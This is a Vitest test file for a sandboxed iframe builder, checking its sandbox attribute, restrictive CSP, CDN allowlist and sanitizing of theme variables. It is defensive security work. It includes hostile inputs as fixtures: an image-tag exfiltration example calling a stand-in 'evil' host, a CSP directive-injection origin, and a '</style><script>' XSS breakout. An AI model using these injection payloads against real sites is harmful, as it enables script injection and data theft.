import { describe, it, expect } from 'vitest'
import {
  buildFreeformSrcdoc,
  buildFrameCsp,
  splitAuthorDocument,
  FREEFORM_SANDBOX,
} from './buildSrcdoc'
import { FREEFORM_CDN_ORIGINS } from './types'

/** Pull one directive out of a policy string. */
function directive(csp: string, name: string): string | undefined {
  return csp
    .split(';')
    .map((part) => part.trim())
    .find((part) => part === name || part.startsWith(name + ' '))
}

describe('sandbox invariant', () => {
  it('never grants allow-same-origin', () => {
    // With allow-same-origin, a frame can reach into the parent document and
    // remove its own sandbox attribute — the isolation is gone, not weakened.
    // If this test fails, the security model is broken, not the test.
    expect(FREEFORM_SANDBOX).toBe('allow-scripts')
    expect(FREEFORM_SANDBOX).not.toContain('allow-same-origin')
    expect(FREEFORM_SANDBOX).not.toContain('allow-popups')
    expect(FREEFORM_SANDBOX).not.toContain('allow-top-navigation')
    expect(FREEFORM_SANDBOX).not.toContain('allow-forms')
    expect(FREEFORM_SANDBOX).not.toContain('allow-modals')
  })
})

describe('buildFrameCsp', () => {
  it('closes every network egress channel', () => {
    const csp = buildFrameCsp()
    expect(directive(csp, 'connect-src')).toBe("connect-src 'none'")
    expect(directive(csp, 'form-action')).toBe("form-action 'none'")
    expect(directive(csp, 'frame-src')).toBe("frame-src 'none'")
    expect(directive(csp, 'base-uri')).toBe("base-uri 'none'")
    expect(directive(csp, 'default-src')).toBe("default-src 'none'")
    // img-src is the subtle one: the app's own policy allows https:, and a
    // srcdoc frame inherits it, so an unrestricted img-src here would leave
    // <img src="https://evil/?data"> open as an exfiltration channel.
    expect(directive(csp, 'img-src')).toBe('img-src data: blob:')
    expect(csp).not.toMatch(/img-src[^;]*https:/)
  })

  it('permits libraries from the pinned CDN allowlist', () => {
    const csp = buildFrameCsp()
    for (const origin of FREEFORM_CDN_ORIGINS) {
      expect(directive(csp, 'script-src')).toContain(origin)
      expect(directive(csp, 'style-src')).toContain(origin)
    }
  })

  it('supports forbidding external subresources entirely', () => {
    const csp = buildFrameCsp({ cdnOrigins: [] })
    expect(directive(csp, 'script-src')).toBe("script-src 'unsafe-inline' 'unsafe-eval' blob:")
  })

  it('drops origins that could inject extra directives', () => {
    const csp = buildFrameCsp({
      cdnOrigins: ['https://ok.example', 'https://evil; connect-src *', 'javascript:alert(1)'],
    })
    expect(csp).toContain('https://ok.example')
    expect(csp).not.toContain('evil')
    expect(csp).not.toContain('javascript:')
    expect(directive(csp, 'connect-src')).toBe("connect-src 'none'")
  })
})

describe('buildFreeformSrcdoc', () => {
  it('puts the CSP before anything it governs, then the runtime, then author content', () => {
    const doc = buildFreeformSrcdoc({ html: '<div id="mine">hello</div>' })
    const cspIndex = doc.indexOf('Content-Security-Policy')
    const runtimeIndex = doc.indexOf('trilogy')
    const authorIndex = doc.indexOf('id="mine"')

    expect(cspIndex).toBeGreaterThan(-1)
    expect(cspIndex).toBeLessThan(runtimeIndex)
    expect(runtimeIndex).toBeLessThan(authorIndex)
  })

  it('installs window.trilogy for author code to use synchronously', () => {
    const doc = buildFreeformSrcdoc({ html: '<p>x</p>' })
    expect(doc).toContain("defineProperty(window, 'trilogy'")
  })

  it('renders a full author document by merging its head and body', () => {
    const doc = buildFreeformSrcdoc({
      html: '<html><head><style>.a{color:red}</style></head><body><div id="mine"></div></body></html>',
    })
    expect(doc).toContain('.a{color:red}')
    expect(doc).toContain('id="mine"')
    // One document, not two.
    expect(doc.match(/<body/g)?.length).toBe(1)
  })

  it('forwards only well-formed theme custom properties', () => {
    const doc = buildFreeformSrcdoc({
      html: '<p>x</p>',
      theme: {
        mode: 'dark',
        vars: {
          '--text-color': '#fff',
          color: 'red',
          '--evil': '</style><script>alert(1)</script>',
        },
      },
    })
    expect(doc).toContain('--text-color: #fff;')
    expect(doc).not.toContain('alert(1)')
    expect(doc).not.toMatch(/^\s*color: red;$/m)
    expect(doc).toContain('data-theme="dark"')
  })

  it('cannot be loosened by an author-supplied policy, because ours comes first', () => {
    const doc = buildFreeformSrcdoc({
      html: '<meta http-equiv="Content-Security-Policy" content="default-src *"><p>x</p>',
    })
    // CSP policies combine restrictively — both are enforced, ours still wins
    // on every directive it names.
    expect(doc.indexOf("connect-src 'none'")).toBeLessThan(doc.indexOf('default-src *'))
  })
})

describe('splitAuthorDocument', () => {
  it('treats a bare fragment as body content', () => {
    expect(splitAuthorDocument('<div>x</div>')).toEqual({ head: '', body: '<div>x</div>' })
  })

  it('separates head and body of a full document', () => {
    const { head, body } = splitAuthorDocument(
      '<html><head><title>t</title></head><body><p>b</p></body></html>',
    )
    expect(head).toContain('<title>t</title>')
    expect(body).toContain('<p>b</p>')
  })

  it('handles a head with no body tag', () => {
    const { head, body } = splitAuthorDocument('<head><style>a{}</style></head><div>x</div>')
    expect(head).toContain('<style>a{}</style>')
    expect(body).toContain('<div>x</div>')
    expect(body).not.toContain('<style>')
  })
})
